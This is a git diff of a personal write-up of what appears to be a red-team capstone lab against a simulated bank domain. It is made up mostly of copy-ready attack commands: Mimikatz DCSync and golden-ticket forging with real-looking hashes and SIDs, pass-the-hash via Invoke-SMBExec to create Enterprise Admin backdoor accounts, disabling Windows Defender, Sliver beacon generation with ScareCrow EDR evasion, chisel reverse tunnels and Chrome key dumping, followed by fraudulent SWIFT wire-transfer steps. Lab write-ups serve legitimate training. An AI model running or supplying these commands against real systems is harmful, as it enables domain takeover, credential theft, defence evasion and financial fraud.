+Start-Process .\OneDrive.exe -WindowStyle Hidden
+# upload to server beacon from here
+upload /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/ .exe C:\programdata\NVM\.exe
+# PsExec && SMBExec
+upload /home/kali/RedTeamCapStoneChallenge/Tools/PSTools.zip
+upload /home/kali/RedTeamCapStoneChallenge/Tools/
+upload /home/kali/RedTeamCapStoneChallenge/Tools/chisel.exe
+
+# Just incase
+upload /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/Powerpnt.exe C:\programdata\NVM\Powerpnt.exe
+
+expand-archive .\mimikatz.zip
+expand-archive .\PSTools.zip
+expand-archive .\kekeo.zip
+
+lsadump::dcsync /dc:rootdc.thereserve.loc /domain:thereserve.loc /user:S-1-5-21-1255581842-1300659601-3764024703-500
+
+Get-ADComputer -Identity "CORPDC"
+# 
+Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
+# 
+
+cd C:\programdata\nvm\mimikatz\x64\
+.\mimikatz.exe
+# Mimkatz 
+# Remember to cycle through exfil and catagorise for data handling
+privilege::debug
+log
+token::elevate
+!+
+# We are DA so
+lsadump::dcsync /user:corp\krbtgt
+lsadump::lsa /patch
+
+# 
+kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<sid of the child dc> /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
+# Paste details into each from template above
+kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt
+
+
+
+
+
+.\Psexec64.exe \\rootdc.thereserve.loc powershell.exe
+
+# this does not work
+import-module ActiveDirectory
+New-ADUser -Name 'NVM2_EA'
+Set-ADAccountPassword -Identity NVM2_EA -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
+Add-ADGroupMember -Identity "Enterprise Admins" -Members "NVM2_EA"
+Enable-ADAccount -Identity NVM2_EA
+net localgroup "Administrators" NVM2_EA /add 
+gpupdate /force
+
+
+
+
+Set-MpPreference -DisableRealTimeMonitoring $true
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 
+![](10hourstopsexec.png)
+
+Find another user with SMBExec.ps1, change hash and:
+```powershell
+# If not possible - 0xB0b used:
+lsadump::dcsync /dc:rootdc.thereserve.loc /domain:thereserve.loc /user:S-1-5-21-1255581842-1300659601-3764024703-500
+
+5e3d8d541c6d3891c20a503464869fa9
+
+Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe New-ADUser NVM2_EA" -verbose
+
+Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe Add-ADGroupMember -Identity 'Enterprise Admins' -Members NVM2_EA" -verbose
+
+Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe Add-ADGroupMember -Identity 'Domain Admins' -Members NVM2_EA" -verbose
+
+Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe Set-ADAccountPassword -Identity NVM2_EA -NewPassword (ConvertTo-SecureString -AsPlainText 'p@ssw0rd1!' -Force)" -verbose
+
+Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe net localgroup Administrators NVM2_EA /add " -verbose
+
+Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe Enable-ADAccount -Identity 'NVM2_EA'" -verbose
+
+Invoke-SMBExec -Target 10.200.116.100 -Domain thereserve.loc -Username Administrator -Hash 5e3d8d541c6d3891c20a503464869fa9 -Command "powershell.exe " -verbose
+```
+![](0xb0btotherescue.png)
+
+10 HOURS today and entire week- RDP inception genuinely four levels deep 
+```powershell
+Set-MpPreference -DisableRealTimeMonitoring $true
+# Chrome on the DC http://10.50.113.184:8443/ROOTDC/Powerpnt.exe
+# Chisel.exe
+# RDP into bankdc 10.200.116.101 NVM2_EA p@ssw0rd1!
+import-module ActiveDirectory
+New-ADUser -Name 'NVMbank'
+Set-ADAccountPassword -Identity NVMbank -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
+Add-ADGroupMember -Identity "Domain Admins" -Members "NVMbank"
+Enable-ADAccount -Identity NVMbank
+net localgroup "Administrators" NVMbank /add 
+gpupdate /force
+# RDP to JMP http://10.50.113.184:8443
+# RDP to Work(1|2) for flags 9 and 10
+```
+
+Quick proof
+![](weareontherootdc.png)
+
+During this process I had to extend this network at the 2 minute mark!!!  
+
+This was as awesome enough to add lighting of the beacons from [LOTR](https://www.youtube.com/watch?v=i6LGJ7evrAg) as reference here.
+![](allthreebeacons.png)
+
 Researching how to substitute `chisel` with `sliver`
+![](Tope.png)
 
 ## Compromise of SWIFT and Payment Transfer
 
+![](messagefromAmoebaman7.png)
+
+First trying myself
+```go
+[server] sliver (BRIEF_PARAMEDIC) > chromiumkeydump 0
+
+[*] Successfully executed chromiumkeydump (coff-loader)
+[*] Got output:
+[ChromiumKeyDump] Target File: C:\Users\NVMbank\AppData\Local\Google\Chrome\User Data\Local State
+[ChromiumKeyDump] Found EncryptedKey at position: 1120
+[ChromiumKeyDump] EncryptedKey total length: 244
+[ChromiumKeyDump] Masterkey: GfdBhFf6+bnnBJbDEm0NaRdhKvqyQHvdBJwgZqY5950=
+```
+
+```c
+privilege::debug
+log
+token::elevate
+!+
+# We are DA so
+lsadump::dcsync /user:corp\krbtgt
+lsadump::lsa /patch
+
+```
+
 Requires two users - One for the memes has to be Emily. 
+- Submit our proof of compromise of the SWIFT Web Access
+- RDP into JMP machine
+- Mimkatz.exe grab two hashes 
+- Have beacon on JMP machine
+```powershell
+Set-MpPreference -DisableRealTimeMonitoring $true
+# Chrome on the DC http://10.50.113.184:8443/ROOTDC/Powerpnt.exe
+# Chisel.exe
+#  NVM2_EA p@ssw0rd1!
+
+# add swift.bank.thereserve.loc to /etc/hosts
+a.holt
+a.turner
+# pick two users
+# 
+# crack both hashes with rockyou.txt if one fails find another - crackstation
+# dump credentials with the beacon
+```
+
+![](swiftbankaccess.png)
 
 So Swift, I remember swift from...
 
@@ -1293,16 +1480,199 @@ So Swift, I remember swift from...
 
 Before the argument enters a brain that Snowden me being here writing this, here is [Jake Williams discussing Shadow Brokers](https://www.youtube.com/watch?v=xuUMlNx72xI) and this is were I learnt that you could actually look at that stuff and not go to prison and you never would have if you did or has any of the account that hosted the dumps. The good thing is that I read the dumps and enjoyed the cool capabilities. There was a lot of Swift usage in the dumps, which seemed like what it would be like being an accountant whereas I was learning about Digital Forensics again and learning about Logging on Windows, because AZ 104's *here is your 1 week worth of logs"* seemed nuts to me... Thanks Jake for the idea of Hunting an example of dealing with the negative space, ducks and bread, the explanations, inspiration and the humour.
 
+```swift
+7f5e73f6-f4a0-4622-bc1b-d75894704524
+Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
+Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
+Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
+Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
+Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
+Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
+Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
+Warning: Permanently added '10.200.116.201' (ECDSA) to the list of known hosts.
+
+In order to proof that you have access to the SWIFT system, dummy accounts have been created for you and you will have to perform the following steps to prove access.
+===============================================
+Account Details:
+Source Email:           nvm@source.loc
+Source Password:        jTsWI401YW3CGQ
+Source AccountID:       647b9340d582ad0c2e103e4d
+Source Funds:           $ 10 000 000
+
+Destination Email:      nvm@destination.loc
+Destination Password:   TosKpI8-AVE3MQ
+Destination AccountID:  647b9360d582ad0c2e103e4e
+Destination Funds:      $ 10
+===============================================
+
+Using these details, perform the following steps:
+1. Go to the SWIFT web application
+2. Navigate to the Make a Transaction page
+3. Issue a transfer using the Source account as Sender and the Destination account as Receiver. You will have to use the corresponding account IDs.
+4. Issue the transfer for the full 10 million dollars
+5. Once completed, request verification of your transaction here (No need to check your email once the transfer has been created).
+```
+
+![](threemoretogo.png)
+
+At this point aI decided to watch [Alh4zr3d started in a rough state and completed this and I hope he feels amazing after this and all the best to the engagement](https://www.twitch.tv/videos/1835142922), but I am going to rewatch this for the finale. 
+
+```swift
+In order to proof that you have capturer access to the SWIFT system, a dummy transaction has been created for you.
+
+Please look for a transaction with these details:
+
+FROM:   631f60a3311625c0d29f5b32
+TO:     647b9340d582ad0c2e103e4d
+
+Look for this transfer and capture (forward) the transaction.
+
+C:young : Password!
+```
+
+![](alnetgroupforpaymentcapturesandapprovers.png)
+
+Displaying the users of these groups
+![](paymentapproversandcapturers.png)
+
+```
+a.holt d1b47b43b82460e3383d974366233ddc
+r.davies  90a12d9dab5cd7b826964e169488d8e9
+```
+
+`C.young : Password!`
+
+DC syncing the `bankdc`
+
+![](aturnerhash.png)
+
+|Hash|Type|Result|
+|---|---|---|
+|fbdcd5041c96ddbd82224270b57f11fc|NTLM|Password!|
 
 
+```
+p@ssw0rd1!
+
+c.young@bank.thereserve.loc : Password!
+
+a.turner@bank.thereserve.loc : 
+# does not work:  Password!
+```
+
+As Al malds there is a Auth  Debugger button
+![](authdebugger.png)
+
+It is a JWT!
+![](itsajwt.png)
+
+But Al and I were not reading
+![](forwardthisidiot.png)
+
+```
+In order to proof that you have approver access to the SWIFT system, a dummy transaction has been created for you.
+
+Please look for a transaction with these details:
+
+FROM:   631f60a3311625c0d29f5b31
+TO:     647b9340d582ad0c2e103e4d
+
+Look for this transfer and approve (forward) the transaction.
+```
+
+So I tried RDP as a.turner with Password! I already dumped the Chrome Passwords:
+```go
+[server] sliver (BRIEF_PARAMEDIC) > chromiumkeydump 0
+
+[*] Successfully executed chromiumkeydump (coff-loader)
+[*] Got output:
+[ChromiumKeyDump] Target File: C:\Users\NVMbank\AppData\Local\Google\Chrome\User Data\Local State
+[ChromiumKeyDump] Found EncryptedKey at position: 1120
+[ChromiumKeyDump] EncryptedKey total length: 244
+[ChromiumKeyDump] Masterkey: GfdBhFf6+bnnBJbDEm0NaRdhKvqyQHvdBJwgZqY5950=
+```
+
+But Password! is fine
+![](passwordBANG.png)
+
+`reallycantguessthis1@`
+
+![](aliceisturning.png)
+
+```
+Checking swift full
+
+This is the final check! Please do not attempt this if you haven't completed all of the other flags.
+Once done, follow these steps:
+1. Using your DESTINATION credentials, authenticate to SWIFT
+2. Using the PIN provided in the SWIFT access flag email, verify the transaction.
+3. Using your capturer access, capture the verified transaction.
+4. Using your approver access, approve the captured transaction.
+5. Profit?
+
+Once you have approved the provided transaction, please enter Y to verify your access.
+
+===============================================
+Account Details:
+Source Email:           nvm@source.loc
+Source Password:        jTsWI401YW3CGQ
+Source AccountID:       647b9340d582ad0c2e103e4d
+Source Funds:           $ 10 000 000
+
+Destination Email:      nvm@destination.loc
+Destination Password:   TosKpI8-AVE3MQ
+Destination AccountID:  647b9360d582ad0c2e103e4e
+Destination Funds:      $ 10
+===============================================
+
+```
+
+```
+c.young@bank.thereserve.loc : Password!
+```
+
+Fumbling around I re-re-reread and I need to put in the pin
+![](fromcyoung.png)
+
+Part 1 of wiring money 101
+![](sourceaddpin.png)
+
+Part 2 of wiring money 101
+![](cyoundconfirm.png)
+
+It is now forwarded to Alice Turner
+![](forwardyes.png)
+
+Part 3 of wiring money 101
+![](approvable.png)
+And Alice says yes to wiring 10 million dollars
+![](YESALICEAPproVEtheWIRE.png)
 ## Beyond Rooting Everything
 
 - https://www.youtube.com/watch?v=FRUQMg9IhMA -ntlm relay for server 1
 
 - Patch the way in theoretically to avoid ToU
-- Add a backdoor to custom source code theoretically to avoid ToU
+- Add a backdoor to custom source code theoretically to avoid ToU - swift backdoor
+
+- Sliver Pivots to JMP
+- Chisel from VPN to JMP
+
+Preemptive Chisel organisation
+``` bash
+# VPN - proxying throuugh and back
+nohup ./chisel client 10.50.113.184:20000 20001:127.0.0.1:20000 &
+# Open 20002 on VPN for CORPDC 
+nohup ./chisel client 10.50.113.184:20000 20002:127.0.0.1:port &
+# CORPDC 
+nohup ./chisel client 10.200.116.12:20002 R:127.0.0.1:20002:socks &
+
+```
 
 
+![](congrats.png)
+
+And Surpassing SuitGuy
+![](suppacingsuitguy.png)
 ## References - dont add just read and script a references section
 
 READ FIRST
@@ -1313,7 +1683,8 @@ https://tishina.in/opsec/sliver-opsec-notes#implant%20obfuscation%20and%20export
 https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors
 https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
 https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/
-
+https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
+https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire
 
 
 ## Appendix
@@ -1325,13 +1696,13 @@ Silver and EDR bypassing Scarecrow
 // 
 // remember to upx
 // For VPN
-generate --mtls 10.50.116.126:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
-generate beacon --mtls 10.50.116.126:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
-mtls -L 10.50.116.126 -l 11011
-mtls -L 10.50.116.126 -l 11012
+generate --mtls 10.50.113.184:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
+generate beacon --mtls 10.50.113.184:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
+mtls -L 10.50.113.184 -l 11011
+mtls -L 10.50.113.184 -l 11012
 
 // Server 1
-generate beacon --mtls 10.50.116.126:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
+generate beacon --mtls 10.50.113.184:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
 // ScareCrow to bypass Windows Defender - shoot fly with bozaka
 ./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
 ```
@@ -1339,6 +1710,13 @@ generate beacon --mtls 10.50.116.126:11013 -b --arch amd64 --os windows -f shell
 Considerations
 ```
 cracken -c '!@#$%^' -w password_base_list.txt '?w' -o smart-passwds.txt
+```
+
+On older version may have granted additional RDP connections.
+```powershell
+# This was suppose to grat add
+reg add 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG_DWORD /v fdenyTSConnections /d 0 /f
+reg add 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /t REG_DWORD /v  fSingleSessionPerUser /d 0 /f
 ```
 
 Recon
